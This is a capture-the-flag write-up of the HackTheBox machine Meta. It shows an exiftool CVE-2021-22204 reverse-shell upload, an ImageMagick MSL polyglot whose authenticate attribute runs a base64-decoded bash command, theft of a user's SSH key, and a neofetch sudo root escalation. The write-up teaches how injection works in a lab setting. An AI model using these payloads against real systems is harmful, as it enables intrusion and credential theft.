---
layout: post
title: "The Picture Was the Payload"
subtitle: "HTB Meta, where every door is a file that swore it was just an image, and three parsers in a row read the caption out loud and did what it said"
date: 2022-06-18 12:00:00 +0000
description: "Meta is three parsers in a row that read the caption on a picture and ran it. Exiftool to a shell, an ImageMagick cron to a user, a sudo'd neofetch config to root."
image: /assets/og/the-picture-was-the-payload.png
tags: [hackthebox, writeup]
---

Meta is a box about pictures, and the whole thing turns on a lie every picture tells. A picture says "I am just an image, look at me, I cannot do anything." That is false on three separate occasions here, and each time it is a different program that believes it. A metadata reader believes it and runs the caption. A cron job that resizes uploads believes it and runs the caption. And at the very top, a system info tool running as root believes a config file that is really a set of orders. Nobody overpowers anything on Meta. You just keep handing programs a file that swears it is data, and they keep reading part of it as a command. Same confession, three rooms deep, until the prompt comes back wearing root's coat.

```
        M E T A
        =======
        upload.jpg   "i'm only a photo, scout's honor"
              |
              v
        exiftool reads the metadata caption...
        and the caption is perl. shell as www-data.
              |
              v
        a cron resizes uploads every minute.
        the upload is a picture that is also a script. shell as thomas.
              |
              v
        sudo neofetch reads a config you wrote. root.
        the file said data. it meant orders.
                                            像
```

## 0x01 · the gallery out front

`nmap` is short and unbothered. SSH and a web server, nothing else answering.

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2
80/tcp open  http    Apache httpd
```

Port 80 redirects to `artcorp.htb`, so the host is doing name-based virtual hosting. That is the tell to go hunting for siblings. A program serving more than one site off one IP decides which site to show you by reading the `Host:` header you send, like a building with one front desk and a dozen tenants where you say a name and the clerk points you to a floor. So you fuzz the name. `wfuzz` or `ffuf` against the `Host` header, filtering out the default response size, turns up a second tenant nobody linked to.

```
$ ffuf -u http://10.10.11.140 -H "Host: FUZZ.artcorp.htb" \
    -w subdomains-top1million.txt -fs 154
dev01    [Status: 200, Size: 4516]
```

Add `dev01.artcorp.htb` to `/etc/hosts` and browse it. Under `/metaview/` lives a little tool that takes an image upload and prints back its metadata. It is reading EXIF. Behind that friendly form is `exiftool`, and the version matters enormously.

## 0x02 · the caption that was perl

The metadata service runs a vulnerable `exiftool`, and the bug is CVE-2021-22204. Here is the whole shape of it in plain terms. Exiftool understands a huge zoo of file formats, and one of them is DjVu, an old document format whose metadata can carry an annotation field. To handle that field, exiftool passed the contents through a Perl `eval`. Picture a museum docent whose job is to read aloud whatever caption card is taped to a painting. Normally the card says "oil on canvas, 1887." But the docent does not check what is written there. If your card says "oil on canvas, then walk to the safe and open it," the docent reads the whole thing and obeys the second half, because reading and doing were never separated in their head.

So the exploit is not really an exploit binary. It is a JPEG with a poisoned DjVu metadata block welded inside it, where the annotation is Perl. A public proof of concept for CVE-2021-22204 builds exactly that file for you. You hand it a command, it wraps a reverse shell in the metadata, and produces an image.

```
$ python3 cve-2021-22204.py -s '[ perl reverse shell back to 10.10.14.4 on 443 ]'
$ ls
iceberg.jpg
```

Upload `iceberg.jpg` to `/metaview/`. The service calls `exiftool` to read the metadata, reaches the DjVu annotation, runs the Perl, and your listener lights up.

```
$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.11.140]
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The file went in as a picture. It came out as a command, because the parser could not keep the two ideas apart.

## 0x03 · the cron that ate the picture

`www-data` is a foothold, not a home. To find the next move you watch what the box does when nobody is looking. `pspy` is the right tool here. It is a snitch that watches the process table without needing root, so you can see scheduled jobs fire in real time. Think of it like sitting quietly in a lobby and writing down everyone who walks through, including the cleaning crew that only comes at 3 a.m. and assumes the place is empty.

```
$ ./pspy64
2022/01/22 ... UID=1000  /bin/bash /usr/local/bin/convert_images.sh
2022/01/22 ... UID=1000  /usr/local/bin/mogrify -format png *.*
```

Every minute, the user `thomas` (UID 1000) runs a script that calls `mogrify`, part of ImageMagick, against every file dropped in `/var/www/dev01.artcorp.htb/convert_images/`. So whatever you put in that folder gets chewed on by ImageMagick as thomas. And this ImageMagick is version 7.0.10-36, which carries CVE-2020-29599. The bug lives in how ImageMagick handles its own scripting language, MSL, and the `authenticate` attribute on an image element. That attribute was supposed to hold a password for a protected file. Instead it got passed somewhere that a backtick in it would run as a shell command.

The clever part is the file itself. You build a polyglot, a single file that is simultaneously a valid SVG and a valid MSL script, so the SVG part survives ImageMagick noticing it while the MSL part smuggles the payload. The `authenticate` value carries a backticked command, base64-encoded so no special character trips the parser on the way in.

```
<image authenticate='ff" `echo BASE64 | base64 -d | bash`;"'>
  <read filename="pdf:/etc/passwd" />
  <get width="base-width" height="base-height" />
  <write filename="/tmp/iceberg.png" />
  <svg xmlns="http://www.w3.org/2000/svg"
       xmlns:xlink="http://www.w3.org/1999/xlink">
    <image xlink:href="msl:iceberg.svg" height="100" width="100" />
  </svg>
</image>
```

Drop that file into the watched folder under the name the `xlink:href` points at, wait for the next minute tick, and the encoded payload runs as thomas. The cleanest payload just makes thomas's own SSH key readable to you, so you stop relying on a cron you cannot see.

```
$ cat /home/thomas/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
...
$ ssh -i id_rsa thomas@10.10.11.140
thomas@meta:~$ cat user.txt
████████████████████████████████
```

A second picture, a second parser, a second program that read the contents as instructions. The box is rhyming with itself on purpose.

## 0x04 · the config that gave orders

Thomas can run one thing as root without a password. Check `sudo -l` and read it carefully, because the interesting part is not the command, it is the line above it.

```
Defaults env_keep += "XDG_CONFIG_HOME"
User thomas may run: (root) NOPASSWD: /usr/bin/neofetch ""
```

`neofetch` is the toy that prints your distro logo in ASCII art with your specs next to it. Harmless. But it loads a config file every time it runs, and the config file is not data. It is shell. Neofetch sources its config, meaning the lines in that file get executed as commands. That alone would be fine if the file lived somewhere only root could write. The fatal detail is `env_keep += "XDG_CONFIG_HOME"`. Sudo normally scrubs your environment variables before running a root command, the way airport security empties your pockets before you board. That one `env_keep` line is a hole in the screening that lets you carry `XDG_CONFIG_HOME` straight through. And `XDG_CONFIG_HOME` is exactly the variable that tells neofetch where to look for its config.

So you point it at a config you own. Write a line into thomas's own config directory, set the variable, and run the sudo command.

```
thomas@meta:~$ mkdir -p ~/.config/neofetch
thomas@meta:~$ echo 'exec /bin/bash' > ~/.config/neofetch/config.conf
thomas@meta:~$ XDG_CONFIG_HOME=/home/thomas/.config sudo /usr/bin/neofetch ""
root@meta:~# id
uid=0(root) gid=0(root) groups=0(root)
root@meta:~# cat /root/root.txt
████████████████████████████████
```

Neofetch starts, looks up its config path from the variable you smuggled past sudo, finds your file, and runs `exec /bin/bash` as root because root is who launched it. The picture motif finally drops away here, but the disease is identical. A file that was supposed to be settings was read as commands.

## 0x05 · the honest caveat

It is tempting to call Meta a parade of CVEs, patch the three versions, and move on. The versions are real and they are fixed, sure. But the through-line is older than any of them and it is the only thing worth carrying out of this box. Four times in a row, a program took a thing that was supposed to be inert, a photo, an upload, a settings file, and let part of that thing reach in and pull a lever. Exiftool ran a caption. ImageMagick ran an attribute. Neofetch ran a config. Each one is the same mistake injection always is, the failure to draw a hard wall between "this is content I display" and "this is a command I obey."

And notice the privesc that actually scares me here is the last one, because nothing was unpatched. Neofetch was doing precisely what it was documented to do. The whole root was built from two ordinary administrative choices stacked carelessly. Someone gave thomas a passwordless sudo entry to a cosmetic tool, and someone added one variable to the env_keep allowlist to make it convenient. Neither is a vulnerability you can `apt upgrade` away. They are configuration decisions, and configuration is where the calm, quiet roots live. A patch fixes the parser. Only paranoia fixes the policy. When you let a config file run as code and let the attacker choose which config file, you have rebuilt CVE-2021-22204 in a costume made of good intentions.

## 0x06 · outro

```
the photo said it was only a photo.
three programs took its word and ran the caption.
the config said it was only settings.
root read it as a to-do list.

nothing forced a door. every parser opened one
because it could not tell a label from an order.

separate the data from the command. read what runs as root. wear black.

                                                            EOF
```

---

*HTB: Meta, retired 11 Jun 2022. A medium Linux box that is really one lesson told three times, the wall between data and instruction, knocked down by a metadata reader, an image converter, and a config file. Every door here was a picture that swore it was harmless.*